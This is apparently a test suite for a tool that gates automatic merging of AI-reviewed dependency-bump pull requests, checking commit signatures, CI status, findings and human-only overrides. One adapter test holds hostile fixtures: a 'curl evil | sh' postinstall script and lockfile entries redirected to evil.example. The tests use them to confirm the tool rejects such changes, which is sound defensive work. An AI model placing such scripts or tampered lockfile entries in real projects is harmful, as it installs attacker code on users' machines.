// Merge eligibility and the merge boundary. One fully eligible case, then
// each test breaks exactly one fact and checks the exact reason.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  BLOCKED,
  ELIGIBLE,
  ESCALATE,
  POLICY_INVALID,
  REFUSED,
  dryRunExecutor,
  evaluateEligibility,
  localFacts,
  openReview,
  parsePolicy,
  prepareMerge,
  versionChange,
} from "../src/index.mjs";
import { npmDependencyChanges } from "../src/adapters/npm.mjs";
import { githubFacts } from "../src/adapters/github.mjs";
import { gitRepo, stateRoot } from "./helpers.mjs";
import { next } from "../src/index.mjs";

const BIN = new URL("../src/cli/main.mjs", import.meta.url).pathname;
const POLICY = JSON.parse(readFileSync(new URL("../examples/dependabot-patch.json", import.meta.url), "utf8"));
const REF = { repo: "acme/widgets", key: "9" };
const BOT = "dependabot[bot]";
const A = "agent:test";

// A completed, deps-patch review of a lockfile bump, and the facts that make
// it eligible.
function eligibleCase({ policy = POLICY, finding = null, classify = { category: "deps-patch", probability: 0.95 } } = {}) {
  const repo = gitRepo(policy);
  repo.git("checkout", "-q", "main");
  repo.write("package.json", JSON.stringify({ name: "w", dependencies: { lodash: "^4.17.20" } }));
  repo.write("package-lock.json", JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/lodash": { version: "4.17.20" } } }));
  repo.commit("deps");
  repo.git("checkout", "-q", "-b", "dependabot/npm/lodash");
  repo.write("package.json", JSON.stringify({ name: "w", dependencies: { lodash: "^4.17.21" } }));
  repo.write("package-lock.json", JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/lodash": { version: "4.17.21" } } }));
  const head = repo.commit("bump lodash");
  const review = openReview(stateRoot(), REF);
  review.start({ git: repo.adapter, targetRef: "main", head, actor: A });
  review.recordRun({ slot: "correctness", status: "ok", model: "anthropic/opus", head, actor: A, findings: finding ? [finding] : [] });
  review.recordRun({ slot: "security", status: "ok", model: "openai/gpt-5.5", head, actor: A });
  review.advance({ actor: A });
  if (finding) {
    for (const [kind, label] of [["finding-verification", "confirmed"], ["finding-severity", finding.severity], ["finding-origin", "introduced"], ["finding-triage", finding.triage ?? "agent-fixable"]]) {
      review.decide({ candidate: 1, kind, label, probability: 0.9, rationale: "r", verifier: { model: "openai/gpt-5.5" }, head, actor: A });
    }
  }
  if (classify) review.classify({ ...classify, rationale: "lockfile-only patch bump", classifier: { model: "openai/gpt-5.5" }, head, actor: A });
  review.report({ actor: A });
  const state = review.read();
  const round = state.rounds[1];
  const local = localFacts({ git: repo.adapter, round, targetRef: "main", head });
  const facts = {
    observedAt: "2026-10-20T00:00:00.000Z",
    ...local,
    changedPaths: ["package.json", "package-lock.json"],
    author: { login: BOT, type: "Bot" },
    commits: [{ sha: head, verified: true, reason: "valid", author: BOT, committer: "web-flow" }],
    commitsComplete: true,
    source: "github",
    checks: { required: ["test"], runs: [{ name: "test", headSha: head, status: "completed", conclusion: "success" }] },
    approvals: { count: 0, required: 0 },
    branchProtection: { known: true, satisfied: true },
    dependencyChanges: npmDependencyChanges(repo.adapter, local.mergeBase, head),
  };
  return { repo, review, state, facts, head };
}

const codes = (e) => e.reasons.map((r) => r.code);
const with_ = (facts, patch) => ({ ...structuredClone(facts), ...patch });

test("a trusted Dependabot patch bump with green checks is eligible, with provenance", () => {
  const { state, facts, head } = eligibleCase();
  const e = evaluateEligibility({ state, facts });
  assert.equal(e.outcome, ELIGIBLE, JSON.stringify(e.reasons));
  assert.deepEqual(e.reasons, []);
  assert.equal(e.provenance.rule, "dependabot-npm-patch");
  assert.equal(e.provenance.observed.head, head);
  assert.equal(e.provenance.binding.head, head);
  assert.match(e.provenance.factsDigest, /^sha256:/);
  assert.deepEqual(facts.dependencyChanges.map((d) => [d.name, d.from, d.to, d.change]), [
    ["lodash", "4.17.20", "4.17.21", "changed"],
    ["lodash", "4.17.20", "4.17.21", "changed"],
  ]);
});

test("a PR title or green CI alone is not enough: the author, commits and dependency changes are checked", () => {
  const { state, facts } = eligibleCase();
  const human = evaluateEligibility({ state, facts: with_(facts, { author: { login: "mallory", type: "User" } }) });
  assert.equal(human.outcome, BLOCKED);
  assert.deepEqual(codes(human), ["no-rule-matches"]);
  assert.match(human.reasons[0].rules[0].why[0], /the author is mallory/);
  const pushed = evaluateEligibility({ state, facts: with_(facts, { commits: [...facts.commits, { sha: "f".repeat(40), verified: false, author: "mallory" }] }) });
  assert.deepEqual(pushed.reasons[0].rules[0].why, [
    "commit ffffffffffff has no verified signature",
    "commit ffffffffffff was authored by mallory",
    "commit ffffffffffff was committed by an unknown account, not signed by the host",
  ]);
  // Signed by someone else, with the bot's author email: GitHub says
  // verified and attributes it to the bot, but the committer is a person.
  const forged = evaluateEligibility({ state, facts: with_(facts, { commits: [...facts.commits, { sha: "e".repeat(40), verified: true, reason: "valid", author: BOT, committer: "mallory" }] }) });
  assert.deepEqual(forged.reasons[0].rules[0].why, ["commit eeeeeeeeeeee was committed by mallory, not signed by the host"]);
  const truncated = evaluateEligibility({ state, facts: with_(facts, { commitsComplete: false }) });
  assert.match(truncated.reasons[0].rules[0].why[0], /only part of the commits/);
  const minor = evaluateEligibility({ state, facts: with_(facts, { dependencyChanges: [{ name: "lodash", from: "4.17.21", to: "4.18.0", change: "changed" }] }) });
  assert.match(minor.reasons[0].rules[0].why[0], /4\.18\.0 is minor, not a patch update/);
  const added = evaluateEligibility({ state, facts: with_(facts, { dependencyChanges: [{ name: "left-pad", from: null, to: "1.0.0", change: "added" }] }) });
  assert.match(added.reasons[0].rules[0].why[0], /is added, not a patch update/);
  const unknown = evaluateEligibility({ state, facts: with_(facts, { dependencyChanges: null }) });
  assert.match(unknown.reasons[0].rules[0].why[0], /no usable dependency evidence/);
  const extra = evaluateEligibility({ state, facts: with_(facts, { changedPaths: [...facts.changedPaths, "scripts/postinstall.js"] }) });
  assert.match(extra.reasons[0].rules[0].why[0], /scripts\/postinstall\.js is outside the rule's paths/);
});

test("checks must be green for the exact head; unknown required checks or protection block", () => {
  const { state, facts, head } = eligibleCase();
  const old = evaluateEligibility({ state, facts: with_(facts, { checks: { required: ["test"], runs: [{ name: "test", headSha: "0".repeat(40), status: "completed", conclusion: "success" }] } }) });
  assert.deepEqual(codes(old), ["check-missing"], "green on another commit does not count");
  const red = evaluateEligibility({ state, facts: with_(facts, { checks: { required: ["test"], runs: [{ name: "test", headSha: head, status: "completed", conclusion: "failure" }] } }) });
  assert.deepEqual(codes(red), ["check-not-green", "check-failed"]);
  const pending = evaluateEligibility({ state, facts: with_(facts, { checks: { required: ["test"], runs: [{ name: "test", headSha: head, status: "in_progress", conclusion: null }] } }) });
  assert.deepEqual(codes(pending), ["check-not-green"]);
  const optionalRed = evaluateEligibility({ state, facts: with_(facts, { checks: { required: ["test"], runs: [...facts.checks.runs, { name: "lint", headSha: head, status: "completed", conclusion: "failure" }] } }) });
  assert.deepEqual(codes(optionalRed), ["check-failed"], "any failing check on the head blocks");
  assert.deepEqual(codes(evaluateEligibility({ state, facts: with_(facts, { checks: { required: null, runs: facts.checks.runs } }) })), ["required-checks-unknown"]);
  assert.deepEqual(codes(evaluateEligibility({ state, facts: with_(facts, { branchProtection: { known: false, satisfied: null } }) })), ["branch-protection-unknown"]);
  assert.deepEqual(codes(evaluateEligibility({ state, facts: with_(facts, { branchProtection: { known: true, satisfied: false } }) })), ["branch-protection"]);
  const approvals = evaluateEligibility({ state, facts: with_(facts, { approvals: { count: 0, required: 1 } }) });
  assert.match(approvals.reasons[0].rules[0].why[0], /0 approvals; 1 needed/);
});

test("an unresolved disqualifying finding blocks; a cleared one does not; a judgment call goes to a person", () => {
  const f = { title: "lockfile pulls a typosquat", file: "package-lock.json", line: 1, precondition: "p", scenario: "s", evidence: "e" };
  const blocker = eligibleCase({ finding: { ...f, severity: "blocker" } });
  const e = evaluateEligibility({ state: blocker.state, facts: blocker.facts });
  assert.equal(e.outcome, BLOCKED);
  assert.deepEqual(codes(e), ["disqualifying-finding"]);
  // Clearing a blocker overrides an independent verification: people only.
  assert.throws(() => blocker.review.dispose({ finding: 1, as: "wrong", note: "it is the real package", actor: A }), (e) => e.code === "workflow/forbidden");
  blocker.review.dispose({ finding: 1, as: "wrong", note: "it is the real package", actor: "human:steve" });
  assert.equal(evaluateEligibility({ state: blocker.review.read(), facts: blocker.facts }).outcome, ELIGIBLE);
  blocker.review.dispose({ finding: 1, as: "accepted", actor: A });
  assert.deepEqual(codes(evaluateEligibility({ state: blocker.review.read(), facts: blocker.facts })), ["disqualifying-finding"], "accepted means real and still there");

  const nit = eligibleCase({ finding: { ...f, severity: "nit" } });
  assert.equal(evaluateEligibility({ state: nit.state, facts: nit.facts }).outcome, ELIGIBLE, "a nit is not disqualifying by default");

  const call = eligibleCase({ finding: { ...f, severity: "nit", triage: "needs-judgment" } });
  const c = evaluateEligibility({ state: call.state, facts: call.facts });
  assert.equal(c.outcome, ESCALATE);
  assert.deepEqual(codes(c), ["needs-judgment"]);
});

test("a changed head, merge base or policy makes the review stale for merging", () => {
  const { repo, state, facts } = eligibleCase();
  assert.deepEqual(codes(evaluateEligibility({ state, facts: with_(facts, { head: "a".repeat(40) }) })), ["head-changed", "check-missing"]);
  assert.deepEqual(codes(evaluateEligibility({ state, facts: with_(facts, { mergeBase: "b".repeat(40) }) })), ["merge-base-changed"]);
  repo.git("checkout", "-q", "main");
  repo.write("agent-review.json", JSON.stringify({ ...POLICY, thresholds: { classify: 0.99 } }));
  repo.commit("tighten");
  const now = localFacts({ git: repo.adapter, round: state.rounds[1], targetRef: "main", head: facts.head });
  assert.deepEqual(codes(evaluateEligibility({ state, facts: with_(facts, { policyDigest: now.policyDigest }) })), ["policy-changed"]);
});

test("missing or uncertain classification, or a sensitive category, goes to a person", () => {
  const none = eligibleCase({ classify: null });
  const e = evaluateEligibility({ state: none.state, facts: none.facts });
  assert.equal(e.outcome, ESCALATE, "the fix is to classify it, so a person or agent is asked, not told to merge by hand");
  assert.deepEqual(codes(e), ["unclassified"]);
  const unsure = eligibleCase({ classify: { category: "deps-patch", probability: 0.6 } });
  const u = evaluateEligibility({ state: unsure.state, facts: unsure.facts });
  assert.equal(u.outcome, ESCALATE);
  assert.deepEqual(codes(u), ["uncertain-classification"]);
  const sensitive = eligibleCase({ classify: { category: "security-sensitive", probability: 0.95 } });
  assert.deepEqual(codes(evaluateEligibility({ state: sensitive.state, facts: sensitive.facts })), ["escalation-category", "no-rule-matches"]);
});

test("without merge enabled, nothing is eligible", () => {
  const off = eligibleCase({ policy: { ...POLICY, actions: { merge: { enabled: false } } } });
  assert.deepEqual(codes(evaluateEligibility({ state: off.state, facts: off.facts })), ["merge-disabled"]);
});

test("missing required merge configuration is rejected", () => {
  assert.throws(() => parsePolicy(JSON.stringify({ version: 1, actions: { merge: { enabled: true } } })), (e) => e.code === POLICY_INVALID && e.errors[0].path === "actions.merge.rules");
  assert.throws(
    () => parsePolicy(JSON.stringify({ version: 1, actions: { merge: { enabled: true, rules: [{ name: "r", categories: [], authors: ["x"] }] } } })),
    (e) => e.code === POLICY_INVALID && JSON.stringify(e.errors.map((x) => x.path)) === JSON.stringify(["actions.merge.rules[0].categories", "actions.merge.rules[0].paths"]),
  );
});

test("dry run: eligible only if a fresh recheck matches; a head that moved in between is refused", () => {
  const { state, facts, head } = eligibleCase();
  const eligibility = evaluateEligibility({ state, facts });
  const ok = prepareMerge({ eligibility, recheck: () => evaluateEligibility({ state, facts }), repo: REF.repo, number: 9 });
  assert.deepEqual(ok.result, { merged: false, dryRun: true, wouldMerge: { repo: REF.repo, number: 9, sha: head } });
  assert.equal(ok.simulated, false, "fetched facts are a real decision");
  const fromFile = with_(facts, { source: "file" });
  assert.throws(() => prepareMerge({ eligibility, recheck: () => evaluateEligibility({ state, facts: fromFile }) }), (e) => e.reasons.some((r) => /facts source changed/.test(r.message)), "a recheck from a file cannot stand in for fetched facts");
  const sim = evaluateEligibility({ state, facts: fromFile });
  assert.equal(sim.provenance.factsSource, "file");
  assert.equal(prepareMerge({ eligibility: sim, recheck: () => sim }).simulated, true);

  const moved = with_(facts, { head: "c".repeat(40) });
  assert.throws(
    () => prepareMerge({ eligibility, recheck: () => evaluateEligibility({ state, facts: moved }), repo: REF.repo, number: 9 }),
    (e) => e.code === REFUSED && e.reasons.some((r) => r.code === "stale-eligibility" && /head/.test(r.message)) && e.reasons.some((r) => r.code === "no-longer-eligible"),
  );
  const approved = with_(facts, { approvals: { count: 1, required: 0 } });
  assert.throws(() => prepareMerge({ eligibility, recheck: () => evaluateEligibility({ state, facts: approved }), repo: REF.repo, number: 9 }), (e) => e.reasons.some((r) => /approvals changed/.test(r.message)), "even a change that looks harmless needs a new decision");
  const blocked = evaluateEligibility({ state, facts: with_(facts, { branchProtection: { known: false } }) });
  assert.throws(() => prepareMerge({ eligibility: blocked, recheck: () => blocked }), (e) => e.reasons[0].code === "not-eligible");
  assert.throws(() => prepareMerge({ eligibility, recheck: () => eligibility, executor: { name: "real", merge: () => ({ merged: true }) } }), (e) => e.reasons[0].code === "no-executor", "only dry runs are possible");
  assert.equal(dryRunExecutor.dryRun, true);
});

test("the CLI: eligibility check and merge dry-run from facts files, with a recheck that catches a moved head", () => {
  const { review, facts, head } = eligibleCase();
  const root = review.log.paths.dir.split("/v2/")[0];
  const dir = mkdtempSync(join(tmpdir(), "facts-"));
  const now = join(dir, "now.json");
  const later = join(dir, "later.json");
  writeFileSync(now, JSON.stringify(facts));
  writeFileSync(later, JSON.stringify({ ...facts, head: "c".repeat(40) }));
  const cli = (...args) => spawnSync("node", [BIN, ...args, "--repo", REF.repo, "--key", REF.key, "--state", root], { encoding: "utf8" });
  const check = cli("eligibility", "check", "--facts", now, "--text");
  assert.equal(check.status, 0, check.stderr);
  assert.equal(check.stdout.trim(), "eligible (rule dependabot-npm-patch); simulated from file facts");
  const dry = cli("merge", "dry-run", "--facts", now);
  assert.equal(dry.status, 0, dry.stderr);
  assert.deepEqual(JSON.parse(dry.stdout).result, { merged: false, dryRun: true, wouldMerge: { repo: REF.repo, number: REF.key, sha: head } });
  const stale = cli("merge", "dry-run", "--facts", now, "--recheck-facts", later);
  assert.equal(stale.status, 1);
  assert.ok(JSON.parse(stale.stderr).error.reasons.some((r) => r.code === "stale-eligibility"));
  const blocked = cli("eligibility", "check", "--facts", later, "--text");
  assert.match(blocked.stdout, /^blocked; simulated from file facts\n  blocks: the head is now cccccccccccc/);
  assert.equal(cli("eligibility", "check").status, 2, "facts are required: --pr or --facts");
});

test("a local target behind the host's tip blocks: the policy and merge base may be stale", () => {
  const { state, facts } = eligibleCase();
  const behind = with_(facts, { target: { ref: "main", commit: "9".repeat(40) }, localTarget: { ref: "main", commit: facts.target.commit } });
  const e = evaluateEligibility({ state, facts: behind });
  assert.deepEqual(codes(e), ["target-not-fetched"]);
  assert.match(e.reasons[0].message, /fetch it, then start the review again/);
});

test("a disputed finding: rejecting it drops it; approving it makes it real, and a person can then clear it", () => {
  const f = { title: "lockfile pulls a typosquat", file: "package-lock.json", line: 1, precondition: "p", scenario: "s", evidence: "e" };
  const run = (decision) => {
    const repo = gitRepo(POLICY);
    const review = openReview(stateRoot(), REF);
    review.start({ git: repo.adapter, targetRef: "main", head: "feature", actor: A });
    review.recordRun({ slot: "correctness", status: "ok", model: "anthropic/opus", head: repo.head, actor: A, findings: [f] });
    review.recordRun({ slot: "security", status: "ok", model: "openai/gpt-5.5", head: repo.head, actor: A });
    review.advance({ actor: A });
    const d = (kind, label, model) => review.decide({ candidate: 1, kind, label, probability: 0.9, rationale: "r", verifier: { model }, head: repo.head, actor: A });
    d("finding-verification", "confirmed", "openai/gpt-5.5");
    d("finding-verification", "refuted", "google/gemini-3");
    assert.deepEqual(next(review.read()).action.findings.map((x) => x.kinds), [["finding-severity", "finding-origin"]], "a disputed finding is rated before a person settles it");
    d("finding-severity", "blocker", "openai/gpt-5.5");
    d("finding-origin", "introduced", "openai/gpt-5.5");
    review.classify({ category: "deps-patch", probability: 0.95, rationale: "r", classifier: { model: "openai/gpt-5.5" }, head: repo.head, actor: A });
    review.report({ actor: A });
    const x = review.read().escalations.find((e) => e.code === "verifiers-disagree");
    review.resolveEscalation({ id: x.id, decision, reason: "looked at it", actor: "human:steve" });
    return review;
  };
  const finding = (e) => e.reasons.filter((r) => r.finding === 1 || r.code === "escalation-rejected").map((r) => r.code);
  const rejected = run("reject");
  assert.deepEqual(finding(evaluateEligibility({ state: rejected.read(), facts: { head: null } })), [], "rejected: not a problem, and nothing blocks on it");
  const approved = run("approve");
  assert.deepEqual(finding(evaluateEligibility({ state: approved.read(), facts: { head: null } })), ["disqualifying-finding"]);
  approved.dispose({ finding: 1, as: "not-worth-it", note: "pinned upstream", actor: "human:steve" });
  assert.deepEqual(finding(evaluateEligibility({ state: approved.read(), facts: { head: null } })), []);
});

test("once the change is classified, only a person can change its category", () => {
  const { review, head } = eligibleCase({ classify: { category: "security-sensitive", probability: 0.95 } });
  const cls = (category, actor) => review.classify({ category, probability: 0.99, rationale: "r", classifier: { model: "openai/gpt-5.5" }, head, actor });
  assert.throws(() => cls("deps-patch", A), (e) => e.code === "workflow/forbidden");
  assert.equal(review.read().rounds[1].classification.category, "security-sensitive");
  cls("deps-patch", "human:steve");
  assert.equal(review.read().rounds[1].classification.category, "deps-patch");
});

test("the npm adapter fails closed on what is not a plain version step", () => {
  const repo = gitRepo(POLICY);
  repo.git("checkout", "-q", "main");
  const lock = (pkgs, extra = {}) => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, ...pkgs }, ...extra });
  const lodash = (v, more = {}) => ({ "node_modules/lodash": { version: v, resolved: `https://registry.npmjs.org/lodash/-/lodash-${v}.tgz`, integrity: `sha512-${v}`, ...more } });
  repo.write("package.json", JSON.stringify({ name: "w", dependencies: { lodash: "^4.17.20" } }));
  repo.write("package-lock.json", lock(lodash("4.17.20")));
  const base = repo.commit("base");
  const at = (pkg, lockText) => {
    repo.write("package.json", JSON.stringify(pkg));
    repo.write("package-lock.json", lockText);
    return repo.commit("change");
  };
  const changes = (head) => npmDependencyChanges(repo.adapter, base, head).map((c) => [c.name, c.change, c.detail ?? null]);

  const swapped = at({ name: "w", dependencies: { lodash: "^4.17.20" } }, lock(lodash("4.17.20", { resolved: "https://evil.example/lodash.tgz", integrity: "sha512-evil" })));
  assert.deepEqual(changes(swapped), [["lodash", "other", "resolved, integrity changed without a version change"]]);

  const otherHost = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, lock(lodash("4.17.21", { resolved: "https://evil.example/lodash-4.17.21.tgz" })));
  assert.equal(changes(otherHost)[0][1], "other");
  assert.match(changes(otherHost)[0][2], /registry changed from registry\.npmjs\.org to evil\.example/);

  const installScript = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, lock(lodash("4.17.21", { hasInstallScript: true })));
  assert.deepEqual(changes(installScript)[0], ["lodash", "other", "hasInstallScript changed"]);

  const script = at({ name: "w", dependencies: { lodash: "^4.17.21" }, scripts: { postinstall: "curl evil | sh" } }, lock(lodash("4.17.21")));
  assert.deepEqual(changes(script).find((c) => c[0] === "package.json"), ["package.json", "other", "scripts changed"]);

  const operator = at({ name: "w", dependencies: { lodash: "~4.17.21" } }, lock(lodash("4.17.21")));
  assert.deepEqual(changes(operator).find((c) => c[2]?.includes("operator")), ["lodash", "other", 'the range operator changed from "^" to "~"']);

  const v1 = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, JSON.stringify({ lockfileVersion: 1, dependencies: { lodash: { version: "4.17.21" } } }));
  assert.equal(npmDependencyChanges(repo.adapter, base, v1), null, "a lockfile without a packages map is no evidence");

  const clean = at({ name: "w", dependencies: { lodash: "^4.17.21" } }, lock(lodash("4.17.21")));
  assert.deepEqual(changes(clean), [["lodash", "changed", null], ["lodash", "changed", null]], "a plain patch step is still a patch");
});

test("semver: only a release-to-release patch step counts as a patch", () => {
  assert.equal(versionChange("1.2.3", "1.2.4"), "patch");
  assert.equal(versionChange("1.2.3", "1.3.0"), "minor");
  assert.equal(versionChange("1.2.3", "2.0.0"), "major");
  assert.equal(versionChange("1.2.4", "1.2.3"), "other", "a downgrade");
  assert.equal(versionChange("1.2.3", "1.2.4-beta.1"), "other", "a prerelease");
  assert.equal(versionChange("1.2.3", "git+https://x"), "other");
  assert.equal(versionChange("1.2.3", "1.2.3"), "none");
});

test("the GitHub adapter reads facts without writing, and unknown protection stays unknown", () => {
  const head = "d".repeat(40);
  const calls = [];
  const responses = {
    "repos/acme/widgets/pulls/9": { head: { sha: head }, base: { ref: "main" }, user: { login: BOT, type: "Bot" }, mergeable_state: "clean" },
    "repos/acme/widgets/pulls/9/commits": [{ sha: head, commit: { verification: { verified: true } }, author: { login: BOT } }],
    "repos/acme/widgets/pulls/9/files": [{ filename: "package-lock.json" }, { filename: "package.json", previous_filename: "old/package.json" }],
    [`repos/acme/widgets/commits/${head}/check-runs`]: { check_runs: [{ name: "test", head_sha: head, status: "completed", conclusion: "success" }] },
    [`repos/acme/widgets/commits/${head}/status`]: { statuses: [{ context: "ci/external", state: "success" }, { context: "deploy/preview", state: "pending" }] },
    "repos/acme/widgets/collaborators/a/permission": { permission: "write" },
    "repos/acme/widgets/collaborators/c/permission": { permission: "read" },
    "repos/acme/widgets/pulls/9/reviews": [
      { user: { login: "a" }, state: "APPROVED", commit_id: head },
      { user: { login: "b" }, state: "APPROVED", commit_id: "e".repeat(40) },
      { user: { login: "c" }, state: "APPROVED", commit_id: head },
      { user: { login: "c" }, state: "CHANGES_REQUESTED", commit_id: head },
    ],
    "repos/acme/widgets/branches/main": { commit: { sha: "1".repeat(40) } },
  };
  const api = (path) => {
    calls.push(path);
    const key = path.replace(/[?&]per_page=100&page=\d+$/, "");
    if (key.endsWith("/protection")) throw Object.assign(new Error("Not Found"), { status: 404 });
    if (!(key in responses)) throw new Error(`unexpected ${path}`);
    return responses[key];
  };
  const f = githubFacts({ repo: "acme/widgets", number: 9, api, now: () => "t" });
  assert.equal(f.head, head);
  assert.deepEqual(f.changedPaths, ["package-lock.json", "package.json", "old/package.json"], "a rename's old path counts too");
  assert.deepEqual(f.approvals, { count: 1, required: 0, ignored: [] }, "only each reviewer's latest review, on the current head");
  assert.deepEqual(
    f.checks.runs.filter((r) => r.source === "status").map((r) => [r.name, r.status, r.conclusion]),
    [["ci/external", "completed", "success"], ["deploy/preview", "in_progress", null]],
    "commit statuses count as checks",
  );
  assert.deepEqual(f.checks.required, null);
  assert.deepEqual(f.branchProtection, { known: false, satisfied: null, mergeableState: "clean" });
  assert.equal(f.target.commit, "1".repeat(40));
  assert.ok(calls.every((c) => !/merge$/.test(c)), "no merge endpoint is called");

  // An approval from a reviewer without write access does not count.
  responses["repos/acme/widgets/pulls/9/reviews"] = [{ user: { login: "c" }, state: "APPROVED", commit_id: head }, { user: { login: "z" }, state: "APPROVED", commit_id: head }];
  const g = githubFacts({
    repo: "acme/widgets",
    number: 9,
    api: (path) => {
      if (path.endsWith("/collaborators/z/permission")) throw Object.assign(new Error("Not Found"), { status: 404 });
      return api(path);
    },
    now: () => "t",
  });
  assert.deepEqual(g.approvals, { count: 0, required: 0, ignored: [{ login: "c", permission: "read" }, { login: "z", permission: null }] });
});

test("a required check posted as a commit status satisfies eligibility", () => {
  const { state, facts, head } = eligibleCase();
  const viaStatus = with_(facts, { checks: { required: ["ci/external"], runs: [{ name: "ci/external", headSha: head, status: "completed", conclusion: "success", source: "status" }] } });
  assert.equal(evaluateEligibility({ state, facts: viaStatus }).outcome, ELIGIBLE);
});

test("a round stored by an older build, without the newer merge settings, is blocked, not a crash", () => {
  const f = { title: "t", file: "package.json", line: 1, precondition: "p", scenario: "s", evidence: "e", severity: "should-fix" };
  const { state, facts } = eligibleCase({ finding: f });
  const old = structuredClone(state);
  old.rounds[1].policy.resolved.actions.merge = { enabled: false };
  const e = evaluateEligibility({ state: old, facts });
  assert.equal(e.outcome, BLOCKED);
  assert.deepEqual(codes(e), ["merge-disabled", "disqualifying-finding"]);
});
